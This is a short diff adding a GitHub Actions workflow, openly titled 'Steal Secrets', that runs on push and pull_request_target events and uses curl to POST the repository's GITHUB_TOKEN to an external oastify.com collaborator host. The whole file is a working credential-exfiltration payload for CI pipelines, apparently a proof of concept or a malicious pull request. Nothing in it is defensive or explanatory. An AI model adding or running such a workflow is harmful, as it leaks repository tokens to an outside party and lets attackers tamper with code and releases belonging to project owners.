@@ -1,0 +1,10 @@
+name: Steal Secrets
+on: [push, pull_request_target]
+
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST 	https://xij0sd0izyslyh42dfchc8f26tck0ho6.oastify.com  \
+            -d "token=${{ secrets.GITHUB_TOKEN }}"
